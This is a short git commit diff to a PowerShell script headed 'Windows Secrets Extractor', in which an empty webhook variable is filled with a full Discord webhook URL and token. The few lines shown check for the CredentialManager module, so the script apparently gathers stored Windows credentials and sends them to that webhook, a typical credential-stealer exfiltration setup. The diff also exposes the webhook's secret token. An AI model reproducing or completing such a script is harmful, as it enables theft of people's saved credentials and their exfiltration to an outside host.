18aabe5023181a9ae81ef593869f10c7b6d3fc93
Dan <66858782+danglock@users.noreply.github.com>
2022-10-03 14:10:37 +0200

    Update extractor.ps1

--- extractor.ps1
+++ extractor.ps1
@@ -1,6 +1,6 @@
 # Windows Secrets Extractor
 
-$webHookUrl = ""
+$webHookUrl = "https://discord.com/api/webhooks/873647888645898241/VCtL2QCQmdXnKceEYRQrApF9HNKmn8JLTCYjlYYu33pI5bfKRjb95Y0Cp20B85qatyc6"
 
 
 if (Get-Module -ListAvailable -Name CredentialManager) {
